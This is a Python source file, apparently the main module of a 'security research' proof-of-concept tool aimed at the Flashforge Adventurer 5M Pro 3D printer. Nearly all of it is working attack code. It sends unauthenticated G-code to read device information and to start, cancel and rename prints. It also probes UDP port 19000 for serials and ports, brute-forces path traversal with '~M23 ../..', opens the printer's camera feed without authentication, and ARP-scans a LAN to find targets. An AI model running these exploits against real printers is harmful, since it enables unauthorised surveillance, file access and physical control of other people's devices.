# THIS MODULE WILL HOUSE MAIN CODE FOR I PRESUME TO BE THIS MULTI MODULE PROGRAM // AS THE VULNERABILITES FOR THIS 3D PRINTER IS EXTENSIVE



# ETC IMPORTS
import argparse, re, datetime, time, pyfiglet


# NETWORK IMPORTS
import socket, ipaddress, sys, requests
from scapy.all import Ether, ARP, srp, sr1, conf

# UI IMPORTS
from rich.console import Console
from rich.panel import Panel
from rich.live import Live



# NSM IMPORTS
from nsm_vars import Variables
from nsm_database import DataBase


# CONSTANTS
console = Variables.console


conf.verb = False





# DYNAMIC PoCs STORED HERE // 
class POCs():
    """This class will house single methods that will be responsible for running entire POCs"""



    # CVE 1
    @classmethod
    def _information_disclosure(cls):
        """This method will run commands pertaining to information disclosure"""


        console.print(f"[bold green][+] Now running PoC for Information Discolure!")

        success = 0
        commands = [
            "~M115", "~M105", "~M119", "~M114", "~M661", "~M650", "~M27"
        ]

        data = {} 
        data["time_stamp"] = datetime.datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
        data["total"] = 0


        space = " " * 5
        
        for c in commands:


            name = Variables.commands.get(c)
            console.print(f"\n[yellow][!] Running {c} <-> {name}")
            
            response = Flash_Forge._push_gcode(command=c, verbose=False, timeout=5)

            if response:

                success += 1
                k = []
                try:
                    for val in response.splitlines():

                        console.print(f"{space}{val}")
                        k.append(val)

                    data[c] = k  

                except Exception:
                    console.print(response)
                    data[c] = str(response)

            else: console.print(f"[bold red][-] No response received")


        data["total"] = success
        if Variables.save: DataBase.push_information_discolure(data=data)
        console.print(f"\n\n[yellow][!] Successful commands: {success}/{len(commands)}")
        console.print(f"[bold green][+] Successfully ran PoC for Information Discolure!")        



    # CVE 1 - Part 2
    @classmethod
    def _physical_actuation(cls):
        """This method run commands pertaining to being able to physically controll the 3d printer"""


        console.print(f"[bold green][+] Now running PoC for Physical Actuation!")


        success = 0
        commands = [
            "~M146",  # LED ON
            "~M146",  # LED OFF
            "~M23",   # Select/start print
            "~M114",  # Read axis positions
            "~M610",  # Rename printer
            "~M26",   # Cancel print
        ]



        order = [
            "~M146",
            "~M23",
            "~M146",
            "~M114",
            "~M610",
            "~M23",

            "~M26",
            "~M146"
        ]


        space = " " * 5
        sleep = 2

        for c in order:

            name = Variables.commands.get(c); val = False

            if "~M610" in c: val = f"NSM-PoC"
            if "~M23" in c: sleep = 6

            console.print(f"\n[yellow][!] Running {c} <-> {name}")

            
            response = Flash_Forge._push_gcode(command=c, val=val, verbose=False)
            
            if response:

                success += 1
                for val in response.splitlines():

                    console.print(f"{space}{val}")


            else: console.print(f"[bold red][-] No response received")


            time.sleep(sleep)


        console.print(f"\n\n[yellow][!] Successful commands: {success}/{len(commands)}")
        console.print(f"[bold green][+] Successfully ran PoC for Physical Actuation!")        



    # CVE 1 - Part 3
    @classmethod
    def _scan_port_19000(cls):
        """This method allows for us to find said printers via a empty udp packets that will query said printer giving pack sensitive info on the device"""



        console.print(f"[bold green][+] Now running PoC for 3D printer discover via probing of port 19000!")

        ip   = Variables.ip
        port = 19000

        data = {} 
        data["time_stamp"] = datetime.datetime.now().strftime("%d/%m/%Y, %H:%M:%S")

        try:

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:

                s.settimeout(5)
                s.connect((str(ip), int(port)))


                # NOTICE HOW I DONT HAVE TO FORGE OR REPLICATE ANY TYPE OF REAL STRUCTURE/COMMAND. // LOLLOLOLOLOLOLOLOL // LAZY/POOR DEVELOPMENT
                s.sendall(b" ")

                response = s.recv(4098)


                if response:
                    

                    serial       = response[0x92:].split(b'\x00')[0].decode()
                    pid          = response[0x89]
                    model        = Variables.FLASHFORGE_MODELS.get(pid, "Unknown")
                    gcode_port   = (response[0x84] << 8) | response[0x85]
                    vendor_id    = (response[0x86] << 8) | response[0x87]
                    ctrl_session = response[0x8b]
                    product_type = (response[0x8c] << 8) | response[0x8d]
                    http_port    = (response[0x8e] << 8) | response[0x8f]
                    connect_mode = response[0x90]
                    cloud_bind   = response[0x91]

                    data["serial"]       = serial
                    data["pid"]          = f"0x{pid:04X}"
                    data["model"]        = model
                    data["vendor_id"]    = f"0x{vendor_id:04X}"
                    data["product_type"] = f"0x{product_type:04X}"
                    data["gcode_port"]   = gcode_port
                    data["http_port"]    = http_port
                    data["ctrl_session"] = ctrl_session
                    data["connect_mode"] = connect_mode
                    data["cloud_bind"]   = cloud_bind
                    data["packet_size"]  = len(response)
                    data["source_ip"]    = ip
                    data["source_port"]  = port

                    console.print(
                        f"\n[bold green][+] UDP 19000 Response Decoded\n"
                        f"    Serial:          [yellow]{serial}\n"
                        f"    PID:             [yellow]0x{pid:04X} ({pid})\n"
                        f"    Model:           [yellow]{model}\n"
                        f"    Vendor ID:       [yellow]0x{vendor_id:04X}\n"
                        f"    Product Type:    [yellow]0x{product_type:04X}\n"
                        f"    G-code Port:     [yellow]{gcode_port}\n"
                        f"    HTTP Port:       [yellow]{http_port}\n"
                        f"    Ctrl Session:    [yellow]{ctrl_session}\n"
                        f"    Connect Mode:    [yellow]{connect_mode}\n"
                        f"    Cloud Bind:      [yellow]{cloud_bind}\n"
                        f"    Packet Size:     [yellow]{len(response)}"
                    )
                


                
                else: console.print(f"[bold red][-] No response received")



        
        except Exception as e: console.print(f"[bold red][-] Exception Error:[yellow] {e}")


        if Variables.save: DataBase.push_port_19000(data=data)
        console.print(f"[bold green][+] Successfully ran PoC for port 19000!")   



    # CVE 2
    @classmethod
    def _path_traversal(cls):
        """This method run commands pertaining to path traversal"""


        console.print(f"[bold green][+] Now running PoC for Path Traversal!")


        success = 0
        command = "~M23"
        values = Variables.valid_paths 

        space = " " * 5


        for val in values:

            val = f"../..{val}"
            console.print(f"\n[yellow][!] Running {command} <-> {val}")
            
            response = Flash_Forge._push_gcode(command=command, val=val, verbose=False)


            if response:

                success += 1
                try:
                    for val in response.splitlines():

                        console.print(f"{space}{val}")

                except Exception: console.print(response)

            else: console.print(f"[bold red][-] No response received")


        console.print(f"\n\n[yellow][!] Successful commands: {success}/{len(values)}")
        console.print(f"[bold green][+] Successfully ran PoC for Path Traversal!")        
  
    

    # CVE 3
    @classmethod
    def _connect_to_camera(cls, timeout=5):
        """This method will be responsible for connecting to an endpoint hosting the live camera feed of the 3D printer"""


        console.print(f"[bold green][+] Now running PoC for Unathenticated Camera Access!")

        try:

            ip = Variables.ip
            endpoint = Variables.endpoints["camera_feed"]

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"
            }

            url = f"http://{ip}:8080{endpoint}"
            console.print(f"\n[yellow][!] Querying -> {url}")

            with requests.Session() as session:
                response = session.get(url=url, headers=headers, stream=True, timeout=timeout)

            if response.status_code in [200, 204]:
                
                console.print(f"[bold green][+] Camera feed active! - Status_code:[yellow] {response.status_code}")

            else: console.print(f"[bold red][-] Failed to connect to camera feed!")


        except Exception as e: console.print(f"[bold red][-] Exception Error:[yellow] {e}")


        console.print(f"\n\n[bold green][+] Successfully ran PoC for Unauthenticated Camera Access!")        



    @classmethod
    def main(cls):
        """This method will be responsible for choosing which PoC(s) run"""


        if not Variables.ip: console.print(f"[bold red][!] --ip required"); sys.exit()

        poc = Variables.poc

        if poc in ["1", "all"]: cls._information_disclosure()
        if poc in ["2", "all"]: cls._physical_actuation()
        if poc in ["3", "all"]: cls._scan_port_19000()
        if poc in ["4", "all"]: cls._path_traversal()
        if poc in ["5", "all"]: cls._connect_to_camera()

        
        if poc not in ["1","2","3","4","5","all"]: 
            console.print(f"\n[bold red][!] Invalid PoC number. Use 1-5 or 'all'"); sys.exit()



class Flash_Forge():
    """Class that will contain code eluding to 3d printer vulnerabilities"""


    @classmethod
    def _Brute_Force_M23(cls):
        """This method will allow for automated path traversal bruteforcing"""


        command = "~M23"
        success = 0

        
        paths = Variables.paths
        valid_paths = {}
        valid_paths["time_stamp"] = datetime.datetime.now().strftime("%d/%m/%Y, %H:%M:%S")

        space = " " * 5


        console.print(f"\n[bold green][+] Now running Path Traversal ~M23 BruteForcing!")
        for path in paths:


            console.print(f"\n[yellow][!] Running {command} <-> {path}")

            val = f"../..{path}"
            response = Flash_Forge._push_gcode(command=command, val=val, verbose=False)


            if response:

 
                try:


                    console.print(f"{space}{path}")
                    for r in response.splitlines():

                        parts = r.partition("Size:")

                        #t = re.search(string=parts,   pattern="Size")
                        if "File opened:" in parts[0]:
                            size = int(parts[2])
                            console.print(f"{space}File Size: {size}")

                            if size > 0:
                                success += 1
                                valid_paths[path] = size

                except Exception: console.print(response)


            else: console.print(f"[bold red][-] No response received")
            

        console.print(valid_paths)
        if Variables.save: DataBase.push_bruteforce(data=valid_paths)
        console.print(f"\n\n[yellow][!] Paths with size over 0: {success}/{len(paths)}")
        console.print(f"[bold green][+] Successfully ran PoC for Path Traversal Bruteforcing with ~M23!")        
  


    @classmethod
    def _find_3d_printers(cls):
        """This method will be used to automatically find 3d printers on the LAN // Perhaps a WAN soon as we do have public endpoints"""


        devices = []
        printers = {}


        iface  = Variables.iface
        subnet = Variables.subnet

        if not subnet: console.print(f"\n[bold red][-] Subnet needed and not given!"); sys.exit()
        valid_subnet = ipaddress.ip_network(subnet)

        if not iface: console.print(f"\n[bold red][!] No iface given, Defaulting to system given Iface:[yellow] {conf.iface.name}")
        Variables.iface = conf.iface.name; iface = Variables.iface
        if not valid_subnet: console.print(f"[bold red][!] Non valid or False subnet given! please try again.")

        arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(valid_subnet))

        response, _ = srp(arp, iface=iface,timeout=5)

        console.print(f"\n[yellow][!] Performing ARP scan on[yellow] {subnet}")


        for sent, recv in response:

            ip  = recv.psrc
            mac = recv.hwsrc
            vendor = False

            devices.append((ip, mac, vendor))


        console.print(f"[bold green][+] LAN Devices found:[/bold green] {len(devices)}")

        console.print(f"\n[yellow][!] Checking discovered devices for 3D Printers...")

        for device in devices:

            Variables.ip = device[0]
            valid = Variables.commands.get("~M115")
            
            console.print(f"[yellow][!] gcode -> {device}")
            response = cls._push_gcode(command="~M115", verbose=False)

            if response:

                printers[Variables.ip] = {
                    "ip":  device[0],
                    "mac": device[1],
                    "~M115": str(response)
                }

      
                console.print(
                    f"\n[bold green][+] Printer found:[/] "
                    f"\n[cyan]     {Variables.ip}:{Variables.port}[/]"
                )
                for val in response.splitlines():
                    console.print(f"     {val}")
          

        print("\n")
        console.print(printers)
        console.print(f"\n[bold green][+] Total 3D Printers found:[/bold green] {len(printers)}")



    @classmethod
    def _push_gcode(cls, command, val=False, verbose=True, timeout=5):
        """This method will be responsible for pushing gcode to printer"""


        if not command: return False
        name = Variables.commands.get(command)


        if val: command = f"{command} {val}"
        #if command == "~M661": command = f"{command} ../../"

        ip   = Variables.ip
        port = Variables.port


        if verbose:
            console.print(f"\n[bold green][+] Target:[yellow] {ip}:{port}")
            console.print(f"[bold green][+] Now running:[yellow] {command} <-> {name}\n")


        try:

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

                s.settimeout(timeout)
                s.connect((str(ip), int(port)))


                s.sendall(command.encode())

                response = s.recv(4096)

                if command == "~M661":
                    #console.print(f"{command} <-> {response}")
                    response = re.findall(rb'/data/[^\x00:\s]+\.3mf', response)
                    return response

                if not response: return False
                if response and verbose: console.print(f"\n{ip}:{port} response:\n {response.decode()}")
                return response.decode()


        except UnicodeEncodeError as e:
            console.print(f"[bold red]UTF-8 decoding failed:[yellow] {e}")
            console.print(f"[yellow]Raw HEX:[/] {response.hex(' ')}")
            decoded = response.decode("utf-8", errors="replace")

            if response and verbose: console.print(f"\n{ip}:{port} response:\n {response}")
            return response

        except Exception as e: console.print(f"[bold red][!] Exception Error:[yellow] {e}"); return False




    @classmethod
    def main(cls):
        """This method will be responsible for spearheading class wide logic"""



        text = pyfiglet.figlet_format(text="FlashForge")
        console.print(f"[bold red]{text}")
        console.print(
            "\n       [bold cyan]Flashforge Adventurer 5M Pro — Security Research[/bold cyan]"
            "\n\n   [bold yellow]12 CVEs • G-code • Path Traversal • Camera • Firmware[/bold yellow]"
            "\n\n                [bold magenta]Made by NSM-Barii[/bold magenta]\n"
        )
        print("\n")


        parser = argparse.ArgumentParser(description="3D Printer POC", add_help=True)


        parser.add_argument("--ip", help="Pass IP that hosts a Flash Forge 3D printer")
        parser.add_argument("--port", default=Variables.port, help="Pass port that host the raw socket connection else defaults to 8899")
        parser.add_argument("--subnet", help="Pass a subnet that will be used to find active LAN devices to then see if there 3D printers")
        parser.add_argument("-i", help="Pass the iface that you would like to use, else the default iface given by your system will be used")
        
        parser.add_argument("-b", help="Send a raw gcode command to the target. Use --commands to see available commands")
        parser.add_argument("-scan", action="store_true", help="Scan subnet for 3D printers via gcode")
        parser.add_argument("--poc", help="Run a PoC by number (1-5) or 'all'. 1=info_disclosure, 2=physical_actuation, 3=path_traversal, 4=camera, 5=udp_discovery")
        parser.add_argument("--bruteforce", action="store_true", help="Run M23 path traversal bruteforcer")
        parser.add_argument("--commands", action="store_true", help="List all available gcode commands")
        parser.add_argument("--save", action="store_true", help="Save scan/bruteforce results")



        args = parser.parse_args()

        Variables.ip   = args.ip
        Variables.port = args.port
        Variables.subnet = args.subnet
        Variables.iface  = args.i


        Variables.poc = args.poc

        Variables.command = args.b
        Variables.scan = args.scan
        Variables.bruteforce = args.bruteforce

        Variables.save = args.save


        if args.commands: console.print(f"\n[bold green][+] Command list:[yellow] {Variables.commands}"); sys.exit()


        if Variables.scan: cls._find_3d_printers(); sys.exit()
        if Variables.poc: POCs.main(); sys.exit()

        
        if Variables.bruteforce:

            if not Variables.ip: console.print(f"[bold red][!] --ip required!"); sys.exit()
            cls._Brute_Force_M23(); sys.exit()

    
        if Variables.command:

            if Variables.command not in Variables.commands: console.print(f"[bold red][!] Please give a valid command of which is within the command list!"); sys.exit()
            cls._push_gcode(command=Variables.command)



if __name__ == "__main__":
    Flash_Forge.main()
    

    # === BELOW IS FOR TESTING ONLY ===
    #Variables.ip = "192.168.1.197"
    #Variables.save = True
    #POCs._scan_port_19000()
    #POCs._connect_to_camera()
    #Flash_Forge._Brute_Force_M23()
    #POCs._path_traversal()
    #POCs._information_disclosure()
    #Flash_Forge.main()